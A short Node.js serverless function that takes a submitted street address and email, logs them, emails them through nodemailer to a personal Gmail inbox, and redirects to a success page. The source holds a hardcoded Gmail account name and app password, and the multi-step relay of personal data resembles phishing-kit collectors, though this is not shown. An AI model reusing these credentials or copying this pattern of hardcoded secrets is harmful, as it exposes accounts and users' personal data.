const nodemailer = require('nodemailer');
const querystring = require('querystring');

exports.handler = async (event, context) => {
  if (event.httpMethod !== 'POST') {
    return {
      statusCode: 405,
      body: 'Method Not Allowed',
    };
  }

  const params = querystring.parse(event.body);
  const { street, city, state, pincode, country, email } = params;

  console.log('Address step - Email:', email, 'Address:', street, city, state, pincode, country);

  // Format address for email
  const addressMessage = `User Address Details:
Email: ${email}
Street: ${street}
City: ${city}
State: ${state}
PIN Code: ${pincode}
Country: ${country}`;

  // Send email to admin
  try {
    await sendEmail(addressMessage);
    console.log('Email sent successfully for:', email);
  } catch (error) {
    console.error('Error sending email:', error.message);
  }

  return {
    statusCode: 302,
    headers: {
      Location: '/success.html',
    },
    body: '',
  };
};

async function sendEmail(message) {
  const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
      user: 'bhanukiran750@gmail.com',
      pass: 'okkxrhicnhxivbvi'
    }
  });

  const mailOptions = {
    from: 'bhanukiran750@gmail.com',
    to: 'bhanukiran750@gmail.com',
    subject: 'User Address Submission',
    text: message
  };

  try {
    const info = await transporter.sendMail(mailOptions);
    console.log('Email sent:', info.response);
  } catch (error) {
    console.error('Email send error:', error);
    throw error;
  }
}
